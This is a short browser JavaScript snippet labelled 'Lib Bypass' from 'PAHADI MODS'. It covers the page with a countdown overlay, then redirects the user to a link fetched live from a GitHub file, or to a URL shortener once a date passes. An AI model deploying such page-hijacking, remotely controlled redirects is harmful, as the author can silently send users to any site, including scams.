(function() {
    'use strict';
    
    // 1. Core Logic (Lib Bypass)
    const _0xload = function(data) {
        // Expiry Check (30 July 2026)
        if (Date.now() >= 1785436200000) {
            window.location.href = 'https://PAHAGIMODS.short.gy/yEqWCw';
            return;
        }
        
        // UI Injection
        const style = document.createElement('style');
        style.innerHTML = '#mko{position:fixed;inset:0;z-index:2147483647;display:flex;justify-content:center;align-items:center;background:rgba(10,12,18,.75);backdrop-filter:blur(12px)}.mk-c{width:300px;text-align:center}.mk-t{font-size:22px;font-weight:900;color:#00f2fe;margin-bottom:20px}.mk-m{font-size:40px;color:#fff}';
        document.head.appendChild(style);
        
        const o = document.createElement('div'); o.id = 'mko';
        o.innerHTML = '<div class="mk-c"><div class="mk-t">PAHADI MODS</div><div class="mk-m" id="cnt">40</div></div>';
        document.body.appendChild(o);
        
        // Timer & Online Link Fetch
        let e = 40;
        const i = setInterval(async () => {
            e--; document.getElementById('cnt').innerText = e;
            if (e <= 0) {
                clearInterval(i);
                try {
                    // GitHub se live link fetch karna
                    const res = await fetch('https://raw.githubusercontent.com/PAHADIMODS/Aincrad-Key/main/Load?v=' + Date.now());
                    const link = (await res.text()).trim();
                    window.location.replace(link);
                } catch(err) { window.location.replace('https://PAHAGIMODS.short.gy/yEqWCw'); }
            }
        }, 1000);
    };

    if (!window._init) {
        window._init = 1;
        _0xload();
    }
})();
